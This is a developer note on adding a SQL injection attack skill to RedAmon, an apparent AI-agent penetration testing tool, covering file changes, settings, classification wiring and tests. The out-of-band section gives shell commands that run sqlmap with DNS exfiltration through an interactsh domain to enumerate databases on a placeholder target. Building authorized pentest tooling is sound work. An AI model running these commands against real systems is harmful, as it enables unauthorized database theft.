# SQL Injection Skill Implementation

## Background

This document records the implementation of the SQL Injection attack skill for RedAmon, following maintainer feedback on the initial PR.

### Original PR Feedback Summary

The original PR was rejected because:

1. **MCP server duplicated existing capabilities** - Tools like `execute_sqli`, `generate_encoded_payload`, etc. were thin wrappers around sqlmap (which `kali_shell` already does) or returned static payloads (which belong in agent prompts).

2. **Interactsh client had functional bugs**:
   - `/quick` generated a random hash but never registered it with the Interactsh server
   - `/poll` started a new process each call, creating different sessions
   - `active_sessions` dict was declared but never used

3. **No classification wiring** - Prompts were added but not integrated with `classification.py`, `state.py`, or `__init__.py`

### What the Maintainer Wanted

A **prompt-driven skill** following the same pattern as CVE exploit, Hydra brute force, and DoS:

- New file: `agentic/prompts/sql_injection_prompts.py` with mandatory workflow
- Classification wiring: Register as built-in skill in `state.py`, `classification.py`, `__init__.py`
- Settings: Configurable sqlmap level/risk/tamper in `project_settings.py`
- UI toggle: Add to `AttackSkillsSection.tsx`
- OOB: Run `interactsh-client` as background process via `kali_shell`, read domain from log file

---

## Implementation Details

### Files Created

| File | Purpose |
|------|---------|
| `agentic/prompts/sql_injection_prompts.py` | Main prompt file with SQL_INJECTION_TOOLS, SQL_INJECTION_TECHNIQUES, SQL_INJECTION_WAF_BYPASS, SQL_INJECTION_AUTH_BYPASS, SQL_INJECTION_POST_EXPLOITATION |
| `webapp/src/components/projects/ProjectForm/sections/SqliSection.tsx` | UI component for SQLi settings |

### Files Modified

| File | Changes |
|------|---------|
| `agentic/prompts/classification.py` | Added `_SQL_INJECTION_SECTION`, added to `_BUILTIN_SKILL_MAP`, added priority instructions, updated skill loops |
| `agentic/state.py` | Added `sql_injection` to `KNOWN_ATTACK_PATHS`, updated `AttackPathClassification` description |
| `agentic/prompts/__init__.py` | Added imports, added routing in `get_phase_tools()`, updated `__all__` exports |
| `agentic/project_settings.py` | Added `SQLI_*` settings, added to `ATTACK_SKILL_CONFIG`, added `get_sqli_settings_dict()` |
| `webapp/src/components/projects/ProjectForm/sections/AttackSkillsSection.tsx` | Added SQL injection to `BUILT_IN_SKILLS`, added `Database` icon, added `SqliSection` conditional render |
| `webapp/prisma/schema.prisma` | Added `sqli*` fields to Project model, updated `attackSkillConfig` default |

### Files Deleted

| File | Reason |
|------|--------|
| `agentic/prompts/sqli_exploitation_prompts.py` | Old file from original PR, replaced by `sql_injection_prompts.py` |

---

## Configuration Settings

### Backend Settings (project_settings.py)

| Setting | Default | Description |
|---------|---------|-------------|
| `SQLI_RISK` | 2 | SQLMap risk level (1=safe, 2=medium, 3=aggressive) |
| `SQLI_LEVEL` | 3 | SQLMap test level (1-5, higher = more injection points) |
| `SQLI_TAMPER` | `space2comment` | Default tamper script for WAF bypass |
| `SQLI_MAX_ATTEMPTS` | 3 | Max different injection techniques to try |
| `SQLI_THREADS` | 5 | Concurrent SQLMap threads |
| `SQLI_TIMEOUT` | 30 | Connection timeout per request |

### Database Fields (Prisma schema)

```prisma
sqliRisk         Int     @default(2)
sqliLevel        Int     @default(3)
sqliTamper       String  @default("space2comment")
sqliMaxAttempts  Int     @default(3)
sqliThreads      Int     @default(5)
sqliTimeout      Int     @default(30)
```

---

## Workflow Architecture

### Classification Flow

1. User sends request like "Test SQL injection on http://target/page?id=1"
2. `build_classification_prompt()` includes `_SQL_INJECTION_SECTION` (if enabled)
3. LLM classifies as `attack_path_type: "sql_injection"`, `required_phase: "exploitation"`
4. Agent routes to SQL injection workflow

### Prompt Injection Flow

1. `get_phase_tools()` checks `attack_path_type == "sql_injection"`
2. Verifies `"sql_injection" in enabled_builtins`
3. Calls `get_sqli_settings_dict()` to get runtime config
4. Injects `SQL_INJECTION_TOOLS.format(**sqli_settings)`
5. Appends `SQL_INJECTION_TECHNIQUES` and `SQL_INJECTION_WAF_BYPASS`

### Tool Usage

The skill uses **existing tools** (no new MCP servers):

| Tool | Usage |
|------|-------|
| `kali_shell` | Run `sqlmap`, `interactsh-client` |
| `execute_curl` | Manual HTTP injection testing |
| `execute_code` | Python scripts for complex payloads |

### Out-of-Band (OOB) Implementation

Instead of a separate MCP endpoint, OOB is handled via:

```bash
# Start interactsh-client in background
interactsh-client -v 2>&1 | tee /tmp/interactsh.log &
sleep 3

# Extract domain from log
OAST_DOMAIN=$(grep -oP '[a-z0-9]+\.oast\.fun' /tmp/interactsh.log | head -1)

# Use with sqlmap
sqlmap -u "http://target/page?id=1" --batch --dns-domain=$OAST_DOMAIN --dbs

# Poll for interactions
tail -f /tmp/interactsh.log
```

This maintains a **stateful session** (same process = same domain).

---

## Verification Checklist

- [x] Python syntax valid (`py_compile` passes)
- [x] `sql_injection` in `KNOWN_ATTACK_PATHS`
- [x] `_SQL_INJECTION_SECTION` defined in classification
- [x] `sql_injection` in `_BUILTIN_SKILL_MAP`
- [x] Priority instructions defined for sql_injection
- [x] `get_sqli_settings_dict()` function exists
- [x] Import and routing in `__init__.py`
- [x] UI toggle in `AttackSkillsSection.tsx`
- [x] Settings component `SqliSection.tsx`
- [x] Prisma schema updated with `sqli*` fields
- [x] `attackSkillConfig` default includes `sql_injection: false`
- [x] Removed SQL injection from `_UNCLASSIFIED_SECTION` examples (now a built-in)

---

## Migration Notes

After pulling these changes:

1. **Database migration required**:
   ```bash
   cd webapp
   npx prisma migrate dev --name add_sql_injection_settings
   ```

2. **Regenerate Prisma client**:
   ```bash
   npx prisma generate
   ```

3. **Restart services**:
   ```bash
   docker compose restart agent webapp
   ```

---

## Testing

### Unit Test: Classification

Send a request like:
```
"Try SQL injection on http://target/vulnerable.php?id=1"
```

Expected classification:
```json
{
  "required_phase": "exploitation",
  "attack_path_type": "sql_injection",
  "confidence": 0.9
}
```

### Integration Test: Workflow

1. Enable SQL injection skill in project settings
2. Set target with known SQLi vulnerability
3. Send request: "Test for SQL injection vulnerabilities"
4. Verify agent:
   - Uses `kali_shell` with `sqlmap`
   - Follows mandatory workflow steps
   - Reports findings correctly

---

## References

- Original PR feedback: GitHub issue discussion
- RedAmon skill pattern: `denial_of_service_prompts.py`, `cve_exploit_prompts.py`
- SQLMap documentation: https://sqlmap.org/
- Interactsh: https://github.com/projectdiscovery/interactsh
